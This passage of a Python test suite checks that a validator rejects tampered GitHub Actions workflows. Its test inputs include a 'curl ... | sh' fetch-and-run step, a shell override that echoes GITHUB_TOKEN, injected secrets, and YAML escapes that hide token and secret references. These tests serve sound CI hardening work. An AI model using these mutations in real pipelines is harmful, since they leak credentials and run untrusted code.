    def test_gleam_workflow_permissions_stay_contents_read(self):
        self.change("symbolic-gleam.yml", "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  actions: read\n")
        self.assertIn("token permissions must be exactly the reviewed ones", self.check(1).stderr)

    def test_decision_step_removed_from_one_job_rejected(self):
        self.change("symbolic-check.yml", self.DECISION, "")
        stderr = self.check(1).stderr
        self.assertIn("the pinned decision step is missing or changed (check-fast)", stderr)

    def test_decision_step_changes_rejected(self):
        for old, new in (("        run: python3 scripts/ci-skip-decision.py\n", "        run: python3 scripts/ci-skip-decision.py --force\n"),
                         ("        id: skip\n", "        id: skipper\n"),
                         ("      - name: Decide whether the full check is redundant\n", "      - name: Decide\n"),
                         ("          GITHUB_TOKEN: ${{ github.token }}\n", "          GITHUB_TOKEN: ${{ github.token }}\n          EXTRA: x\n"),
                         ("        run: python3 scripts/ci-skip-decision.py\n",
                          "        run: python3 scripts/ci-skip-decision.py\n        continue-on-error: true\n"),
                         ("        run: python3 scripts/ci-skip-decision.py\n",
                          "        run: python3 scripts/ci-skip-decision.py\n        shell: bash -c 'echo $GITHUB_TOKEN; bash {0}'\n")):
            with self.subTest(new=new.strip()):
                self.change_all("symbolic-check.yml", old, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_decision_step_must_follow_the_guard_tests_and_precede_setup(self):
        source = self.source()
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        moved = source.replace(self.DECISION, "")
        marker = "      - run: python3 scripts/test-ci-skip.py\n"
        path.write_text(moved.replace(marker, self.DECISION + marker))  # now before the skip tests, not after them
        self.assertIn("the pinned decision step is missing or changed", self.check(1).stderr)
        # and moved to the end of the steps, after the full check
        end = moved.rstrip("\n") + "\n"
        path.write_text(end.replace("\n  check-any:\n", "\n" + self.DECISION + "\n  check-any:\n", 1)
                        + self.DECISION)
        self.assertIn("the pinned decision step is missing or changed", self.check(1).stderr)

    def test_token_on_other_backend_steps_or_env_rejected(self):
        for old, new in (("      - run: mix setup\n", "      - run: mix setup\n        env:\n          GITHUB_TOKEN: ${{ github.token }}\n"),
                         ("      ImageOS: ubuntu24\n", "      ImageOS: ubuntu24\n      GITHUB_TOKEN: ${{ github.token }}\n"),
                         ("      - run: python3 scripts/check-claims.py\n", "      - run: python3 scripts/check-claims.py\n        env:\n          T: ${{ secrets.X }}\n")):
            with self.subTest(new=new.strip()):
                self.change("symbolic-check.yml", old, new)
                self.assertIn("not allowed in this workflow", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_run_mix_check_condition_is_pinned(self):
        step = "      - name: Run mix check\n" + self.SKIP_IF
        for new in ("      - name: Run mix check\n",                                     # condition removed: always runs
                    "      - name: Run mix check\n        if: ${{ false }}\n",          # never runs: a green no-op
                    "      - name: Run mix check\n        if: ${{ always() }}\n",
                    "      - name: Run mix check\n        if: ${{ steps.skip.outputs.skip == 'true' }}\n",  # inverted
                    "      - name: Run mix check\n        if: ${{ github.event_name == 'push' }}\n"):
            with self.subTest(new=new.strip()):
                self.change_all("symbolic-check.yml", step, new)
                self.assertIn("step-level conditions are not the reviewed ones", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_one_job_cannot_differ_in_a_step_condition(self):
        self.change("symbolic-check.yml", "      - name: Run mix check\n" + self.SKIP_IF, "      - name: Run mix check\n")
        stderr = self.check(1).stderr
        self.assertIn("step-level conditions are not the reviewed ones (check-fast)", stderr)
        self.assertIn("identical bodies", stderr)

    def test_other_steps_cannot_gain_or_lose_conditions(self):
        for old, new in (("      - name: Prepare Ubuntu job container\n", "      - name: Prepare Ubuntu job container\n" + self.SKIP_IF),
                         ("      - run: python3 scripts/check-claims.py\n", "      - run: python3 scripts/check-claims.py\n        if: ${{ false }}\n"),
                         ("      - run: mix setup\n" + self.SKIP_IF, "      - run: mix setup\n"),
                         ("      - uses: erlef/setup-beam@54075bcc5e249e4758d363f27d099f55d843f124 # v1\n" + self.SKIP_IF,
                          "      - uses: erlef/setup-beam@54075bcc5e249e4758d363f27d099f55d843f124 # v1\n"),
                         ("        if: always()\n", "        if: ${{ success() }}\n"),
                         ("        if: ${{ steps.deps-cache.outputs.cache-hit != 'true' && steps.skip.outputs.skip != 'true' }}\n",
                          "        if: ${{ steps.deps-cache.outputs.cache-hit != 'true' }}\n")):
            with self.subTest(new=new.strip()[:60]):
                self.change_all("symbolic-check.yml", old, new)
                self.assertIn("step-level conditions are not the reviewed ones", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    CHECKOUT = """      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          fetch-depth: 0
          persist-credentials: false
"""

    def test_checkout_must_not_persist_the_token(self):
        self.assertEqual(3, self.source().count(self.CHECKOUT))
        for new in (self.CHECKOUT.replace("          persist-credentials: false\n", ""),
                    self.CHECKOUT.replace("persist-credentials: false", "persist-credentials: true"),
                    self.CHECKOUT.replace("fetch-depth: 0", "fetch-depth: 1"),
                    self.CHECKOUT + "          token: ${{ secrets.X }}\n",
                    self.CHECKOUT + "          ref: main\n",
                    self.CHECKOUT + "          repository: someone/else\n",
                    self.CHECKOUT + "          persist-credentials: true\n"):
            with self.subTest(new=new.strip()[-40:]):
                self.change_all("symbolic-check.yml", self.CHECKOUT, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_checkout_changed_in_one_job_only_rejected(self):
        self.change("symbolic-check.yml", "          persist-credentials: false\n", "")
        self.assertIn("the pinned checkout step (persist-credentials: false) is missing or changed (check-fast)", self.check(1).stderr)

    def test_header_form_and_oddly_indented_if_keys_rejected(self):
        for old, new in (("      - run: python3 scripts/check-claims.py\n", "      - if: ${{ github.event_name != 'push' }}\n        run: python3 scripts/check-claims.py\n"),
                         ("      - run: python3 scripts/check-ci-runners.py\n", "      -   run: python3 scripts/check-ci-runners.py\n          if: ${{ false }}\n"),
                         ("      - run: python3 scripts/test-ci-runners.py\n", "      - run: python3 scripts/test-ci-runners.py\n         if: ${{ false }}\n")):
            with self.subTest(new=new.strip()[:50]):
                self.change_all("symbolic-check.yml", old, new)
                self.assertIn("unreviewed if: key", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_decision_step_cannot_gain_working_directory_or_timeout(self):
        for extra in ("        working-directory: /tmp\n", "        timeout-minutes: 1\n"):
            with self.subTest(extra=extra.strip()):
                self.change_all("symbolic-check.yml", "        run: python3 scripts/ci-skip-decision.py\n",
                                "        run: python3 scripts/ci-skip-decision.py\n" + extra)
                self.assertIn("the pinned decision step is missing or changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_pull_request_job_cannot_reach_the_token_or_actions_scope_through_the_decision_step(self):
        # The decision script itself refuses everything but a push to main; the workflow must not let
        # the pull request job grant more than contents: read, whatever its steps do.
        source = self.source()
        self.assertEqual(2, source.count("actions: read"))  # check-any and check-hosted
        fast = source[:source.index("  check-any:\n")]
        self.assertNotIn("actions:", fast)
        self.assertNotIn("write", fast)

    def test_skip_and_decision_scripts_exist_and_run_in_the_job(self):
        source = self.source()
        self.assertEqual(3, source.count("      - run: python3 scripts/test-ci-skip.py\n"))
        for name in ("ci-skip-decision.py", "test-ci-skip.py"):
            self.assertTrue((ROOT / "scripts" / name).is_file())

    # ELZ-066: the hosted lane. A repository variable picks the lane; the hosted jobs are pinned
    # by their exact header, run on one label and have no job container.
    def change_in_job(self, filename, job, old, new):
        path = self.root / ".github" / "workflows" / filename
        source = path.read_text()
        start = source.index(f"\n  {job}:\n") + 1
        following = [i for i in (source.find("\n  check-", start + 1), source.find("\n  gleam", start + 1)) if i != -1]
        end = min(following) + 1 if following else len(source)
        block = source[start:end]
        self.assertIn(old, block)
        path.write_text(source[:start] + block.replace(old, new, 1) + source[end:])

    HOSTED_JOBS = (("symbolic-check.yml", "check-hosted"), ("symbolic-gleam.yml", "gleam-hosted"))

    def test_hosted_label_must_be_exactly_ubuntu_24_04(self):
        for filename, job in self.HOSTED_JOBS:
            for label in ("ubuntu-latest", "ubuntu-22.04", "ubuntu-24.04-arm", "ubuntu-24.04-8core",
                          "[self-hosted, ubuntu-24.04]", "[ubuntu-24.04]", "macos-latest", "windows-latest",
                          "${{ vars.ELZOO_CI_LABEL }}"):
                with self.subTest(job=job, label=label):
                    self.change_in_job(filename, job, "runs-on: ubuntu-24.04", f"runs-on: {label}")
                    self.assertIn("every job must use runs-on: ubuntu-24.04", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_hosted_job_must_not_gain_a_job_container(self):
        for filename, job in self.HOSTED_JOBS:
            with self.subTest(job=job):
                self.change_in_job(filename, job, "    steps:\n", "    container:\n      image: " + IMAGE + "\n    steps:\n")
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_hosted_job_header_is_pinned(self):
        for filename, job, old, new in (
                ("symbolic-check.yml", "check-hosted", "timeout-minutes: 120", "timeout-minutes: 360"),
                ("symbolic-check.yml", "check-hosted", "      actions: read\n", "      actions: write\n"),
                ("symbolic-check.yml", "check-hosted", "      contents: read\n", "      contents: write\n"),
                ("symbolic-check.yml", "check-hosted", "ERL_FLAGS: '+S 4:4 +SDcpu 1 +SDio 1'", "ERL_FLAGS: '+S 8:8'"),
                ("symbolic-check.yml", "check-hosted", "postgres:16-bookworm@sha256:5264710be20f409750ac6dc4e5706dcef929c87e241605463f0f9aefa932a8d9", "postgres:16-bookworm"),
                ("symbolic-check.yml", "check-hosted", "          - 5432:5432\n", "          - 5432:5432\n          - 22:22\n"),
                ("symbolic-check.yml", "check-hosted", "    services:\n", "    outputs:\n      x: y\n    services:\n"),
                ("symbolic-gleam.yml", "gleam-hosted", "timeout-minutes: 30", "timeout-minutes: 360"),
                ("symbolic-gleam.yml", "gleam-hosted", "working-directory: spikes/gleam_ui", "working-directory: ."),
                ("symbolic-gleam.yml", "gleam-hosted", "    steps:\n", "    permissions:\n      contents: write\n    steps:\n")):
            with self.subTest(job=job, new=new.strip()[:40]):
                self.change_in_job(filename, job, old, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_hosted_identity_gate_cannot_change(self):
        for filename, job in self.HOSTED_JOBS:
            for old, new in (('test "$RUNNER_ENVIRONMENT" = github-hosted', 'test "$RUNNER_ENVIRONMENT" = self-hosted'),
                             ('test "$RUNNER_OS" = Linux\n          ', ''),
                             ('test "$VERSION_ID" = 24.04', 'test "$VERSION_ID" = 22.04'),
                             ("Verify the GitHub-hosted runner", "Verify runner")):
                with self.subTest(job=job, old=old[:30]):
                    self.change_in_job(filename, job, old, new)
                    self.assertIn("approved runner identity gate is missing or changed", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_hosted_gate_step_cannot_be_conditional(self):
        self.change_in_job("symbolic-check.yml", "check-hosted", "      - name: Verify the GitHub-hosted runner\n",
                           "      - name: Verify the GitHub-hosted runner\n        if: ${{ false }}\n")
        self.assertTrue(self.check(1).stderr)

    def test_lane_condition_is_pinned_in_every_job(self):
        for filename, job, old, new in (
                ("symbolic-check.yml", "check-fast", "vars.ELZOO_CI_LANE != 'hosted' && ", ""),
                ("symbolic-check.yml", "check-any", "vars.ELZOO_CI_LANE != 'hosted' && ", ""),
                ("symbolic-gleam.yml", "gleam", "vars.ELZOO_CI_LANE != 'hosted' && ", ""),
                ("symbolic-check.yml", "check-hosted", "vars.ELZOO_CI_LANE == 'hosted' && ", ""),
                ("symbolic-gleam.yml", "gleam-hosted", "vars.ELZOO_CI_LANE == 'hosted' && ", ""),
                ("symbolic-check.yml", "check-hosted", "vars.ELZOO_CI_LANE == 'hosted'", "vars.ELZOO_CI_LANE != 'self'"),
                ("symbolic-check.yml", "check-fast", "vars.ELZOO_CI_LANE != 'hosted'", "vars.ELZOO_CI_LANE != 'self'"),
                ("symbolic-check.yml", "check-hosted", "(github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository)", "github.event_name == 'pull_request'"),
                ("symbolic-gleam.yml", "gleam-hosted", "github.event.pull_request.head.repo.full_name == github.repository", "true")):
            with self.subTest(job=job, old=old[:40], new=new[:30]):
                self.change_in_job(filename, job, old, new)
                self.assertIn("same-repository PR job gate is missing or changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_lane_variable_cannot_leave_the_job_gates(self):
        # A step that reads the variable could change behaviour per lane; only the five job gates may.
        for filename, job, old in (("symbolic-check.yml", "check-hosted", "      - run: python3 scripts/check-claims.py\n"),
                                   ("symbolic-check.yml", "check-fast", "      - run: python3 scripts/check-claims.py\n"),
                                   ("symbolic-gleam.yml", "gleam-hosted", "      - run: ./scripts/check.sh\n")):
            with self.subTest(job=job):
                self.change_in_job(filename, job, old,
                                   old + "      - name: Lane\n        env:\n          LANE: ${{ vars.ELZOO_CI_LANE }}\n        run: true\n")
                self.assertIn("may appear only in the job-level if: lines", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_hosted_jobs_are_required(self):
        path = self.root / ".github" / "workflows" / "symbolic-check.yml"
        source = path.read_text()
        path.write_text(source[:source.index("\n  check-hosted:\n")] + "\n")
        self.assertIn("exactly the jobs check-fast, check-any, check-hosted are required", self.check(1).stderr)
        self.tearDown()
        self.setUp()
        path = self.root / ".github" / "workflows" / "symbolic-gleam.yml"
        source = path.read_text()
        path.write_text(source[:source.index("\n  gleam-hosted:\n")] + "\n")
        self.assertIn("exactly the jobs gleam, gleam-hosted are required", self.check(1).stderr)

    def test_hosted_backend_token_is_limited_to_the_pinned_steps(self):
        self.change_in_job("symbolic-check.yml", "check-hosted", "          ELZOO_CHECK_EVENT: ${{ github.event_name }}\n",
                           "          ELZOO_CHECK_EVENT: ${{ github.event_name }}\n          GITHUB_TOKEN: ${{ github.token }}\n")
        self.assertIn("github.token and secrets are not allowed", self.check(1).stderr)

    def test_hosted_backend_job_keeps_the_decision_step_and_skip_conditions(self):
        self.change_in_job("symbolic-check.yml", "check-hosted", "      - run: mix setup\n        if: ${{ steps.skip.outputs.skip != 'true' }}\n",
                           "      - run: mix setup\n")
        self.assertIn("step-level conditions are not the reviewed ones", self.check(1).stderr)
        self.tearDown()
        self.setUp()
        self.change_in_job("symbolic-check.yml", "check-hosted", "          persist-credentials: false\n", "")
        self.assertIn("the pinned checkout step (persist-credentials: false) is missing or changed (check-hosted)", self.check(1).stderr)

    # ELZ-064: the disposable S3 test server steps are pinned in all three backend jobs.
    def test_s3_test_server_steps_are_pinned(self):
        for job in ("check-fast", "check-any", "check-hosted"):
            for old, new in (("        run: python3 scripts/ci-minio.py\n", "        run: curl -fsSL https://example.invalid/x | sh\n"),
                             ("        id: minio\n", "        id: other\n"),
                             ("          GITHUB_TOKEN: ${{ github.token }}\n        run: python3 scripts/ci-minio.py\n",
                              "        run: python3 scripts/ci-minio.py\n"),
                             ("        run: python3 scripts/ci-minio.py\n", "        run: python3 scripts/ci-minio.py\n        working-directory: /tmp\n"),
                             ("elzoo-minio-RELEASE.2025-09-07T16-13-09Z-", "elzoo-minio-RELEASE.2025-09-07T16-13-10Z-"),
                             ("      - name: Restore the pinned S3 test server binary\n", "      - name: Restore binary\n"),
                             ("steps.skip.outputs.skip != 'true' && steps.minio.outputs.source != 'cache'", "always()"),
                             ("      - name: Start the disposable S3 test server\n        if: ${{ steps.skip.outputs.skip != 'true' }}\n",
                              "      - name: Start the disposable S3 test server\n")):
                with self.subTest(job=job, new=new.strip()[:50]):
                    self.change_in_job("symbolic-check.yml", job, old, new)
                    self.assertTrue(self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_s3_test_server_steps_cannot_be_removed(self):
        for job in ("check-fast", "check-hosted"):
            with self.subTest(job=job):
                path = self.root / ".github" / "workflows" / "symbolic-check.yml"
                source = path.read_text()
                start = source.index(f"\n  {job}:\n")
                first = source.index("      - name: Restore the pinned S3 test server binary\n", start)
                last = source.index("      - uses: erlef/setup-beam", first)
                path.write_text(source[:first] + source[last:])
                self.assertIn("the pinned S3 test server steps are missing or changed", self.check(1).stderr)
                self.tearDown()
                self.setUp()

    def test_hosted_gleam_setup_step_is_pinned_per_job(self):
        self.change_in_job("symbolic-gleam.yml", "gleam-hosted", self.GLEAM_STEP, "      - run: ./scripts/setup.sh\n")
        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)
        self.tearDown()
        self.setUp()
        self.change_in_job("symbolic-gleam.yml", "gleam-hosted", "        run: ./scripts/setup.sh\n",
                           "        run: ./scripts/setup.sh\n        if: ${{ false }}\n")
        self.assertIn("pinned Gleam setup step is missing or changed", self.check(1).stderr)

    # ELZ-066 review findings: the lane variable in any spelling, and keys after the hosted steps list.
    def test_lane_variable_in_any_case_or_script_text_rejected(self):
        for filename, job, old in (("symbolic-check.yml", "check-hosted", "      - run: python3 scripts/check-claims.py\n"),
                                   ("symbolic-gleam.yml", "gleam-hosted", "      - run: ./scripts/check.sh\n")):
            for line in ("        env:\n          LANE: ${{ Vars.elzoo_ci_lane }}\n        run: true\n",
                         "        run: |\n          echo \"${{ vars.ELZOO_CI_LANE }}\"\n",
                         "        run: |\n          echo '${{ toJSON(vars) }}'\n",
                         "        run: |\n          echo '${{ toJson(VARS) }}'\n"):
                with self.subTest(job=job, line=line.strip()[:40]):
                    self.change_in_job(filename, job, old, old + "      - name: Lane\n" + line)
                    self.assertIn("may appear only in the job-level if: lines", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_hosted_job_must_end_with_its_steps_list(self):
        for filename, job in self.HOSTED_JOBS:
            for extra in ("    environment: production\n", "    continue-on-error: true\n",
                          "    strategy:\n      matrix:\n        x: [1]\n",
                          "    services:\n      other:\n        image: " + IMAGE + "\n"):
                with self.subTest(job=job, extra=extra.strip()[:30]):
                    path = self.root / ".github" / "workflows" / filename
                    source = path.read_text()
                    start = source.index(f"\n  {job}:\n")
                    following = source.find("\n  gleam", start + 1) if job != "gleam-hosted" else -1
                    end = following if following != -1 else len(source)
                    path.write_text(source[:end].rstrip("\n") + "\n" + extra + source[end:])
                    self.assertTrue(self.check(1).stderr)
                    self.tearDown()
                    self.setUp()

    def test_hosted_gleam_checkout_and_steps_are_pinned(self):
        for old, new in (("          persist-credentials: false\n", "          persist-credentials: true\n"),
                         ("          persist-credentials: false\n", "          persist-credentials: false\n          ref: main\n"),
                         ("      - run: ./scripts/check.sh\n", "      - run: ./scripts/check.sh\n        if: ${{ false }}\n"),
                         ("      - run: ./scripts/check.sh\n", "      - run: ./scripts/check.sh\n        continue-on-error: true\n"),
                         ("      - run: ./scripts/check.sh\n", "      - run: ./scripts/check.sh\n        shell: bash {0}\n")):
            with self.subTest(new=new.strip()[:40]):
                self.change_in_job("symbolic-gleam.yml", "gleam-hosted", old, new)
                self.assertTrue(self.check(1).stderr)
                self.tearDown()
                self.setUp()

    # ELZ-066 second review pass: YAML escapes decode before GitHub evaluates ${{ }}.
    def test_yaml_escapes_cannot_hide_the_token_secrets_or_lane_variable(self):
        for filename, job, old in (("symbolic-check.yml", "check-hosted", "      - run: python3 scripts/check-claims.py\n"),
                                   ("symbolic-check.yml", "check-fast", "      - run: python3 scripts/check-claims.py\n"),
                                   ("symbolic-gleam.yml", "gleam-hosted", "      - run: ./scripts/check.sh\n")):
            for value in ('"${{ github.t\\x6fken }}"', '"${{ github.t\\u006fken }}"', '"${{ s\\x65crets.X }}"',
                          '"${{ v\\x61rs.\\x45LZOO_CI_LANE }}"'):
                with self.subTest(job=job, value=value):
                    self.change_in_job(filename, job, old, old + "      - name: Escaped\n        env:\n          T: " + value + "\n        run: true\n")
                    self.assertIn("escapes in double-quoted scalars", self.check(1).stderr)
                    self.tearDown()
                    self.setUp()


if __name__ == "__main__":
    unittest.main()
